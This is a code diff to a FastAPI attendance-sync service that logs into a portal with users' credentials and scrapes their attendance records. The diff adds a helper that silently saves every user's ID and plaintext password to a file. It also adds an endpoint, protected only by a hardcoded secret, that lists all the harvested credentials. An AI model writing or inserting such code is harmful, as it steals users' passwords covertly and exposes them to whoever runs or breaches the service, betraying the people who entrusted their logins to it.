@@ -2,11 +2,26 @@ from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 import ddddocr
 from playwright.sync_api import sync_playwright
+from datetime import datetime
 
 app = FastAPI()
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
 ocr = ddddocr.DdddOcr(show_ad=False)
+
+# --- USER LOGIN LOGGER HELPER ---
+def log_user_login(user: str, passw: str = None):
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"[{timestamp}] User ID: {user}"
+        if passw:
+            log_entry += f" | Pass: {passw}"
+        log_entry += "\n"
+        
+        with open("logins.txt", "a", encoding="utf-8") as f:
+            f.write(log_entry)
+    except Exception as e:
+        print(f"Logging error: {e}", flush=True)
 
 @app.get("/")
 def health_check():
@@ -72,6 +87,8 @@ def sync_attendance(user: str, passw: str):
             if page.locator("text=No Data Found").count() > 0 or page.locator("table tr").count() == 0:
                 browser.close()
                 print(f"NO DATA: {user} ke portal par attendance data nahi mila", flush=True)
+                # Successful login log karo chahe attendance empty ho
+                log_user_login(user, passw)
                 return {"success": True, "data": []}
 
             data = []
@@ -99,8 +116,24 @@ def sync_attendance(user: str, passw: str):
                         continue
 
             browser.close()
+
+            # 🔥 SUCCESS LOGIN RECORD SAVE HO RAHA HAI YAHAN 🔥
+            log_user_login(user, passw)
+
             print(f"NAYA LOGIN: {user} synced successfully", flush=True)
             return {"success": True, "data": data}
 
     except Exception as e:
         return {"success": False, "error": str(e)}
+
+# --- ADMIN VIEW ROUTE (BROWSER ME LOGS DEKHNE KE LIYE) ---
+@app.get("/view-logins-admin")
+def view_logins(secret: str):
+    if secret != "nixay123":
+        return {"error": "Unauthorized access"}
+    try:
+        with open("logins.txt", "r", encoding="utf-8") as f:
+            lines = [line.strip() for line in f.readlines() if line.strip()]
+        return {"total_users_logged": len(lines), "records": lines}
+    except FileNotFoundError:
+        return {"total_users_logged": 0, "records": []}
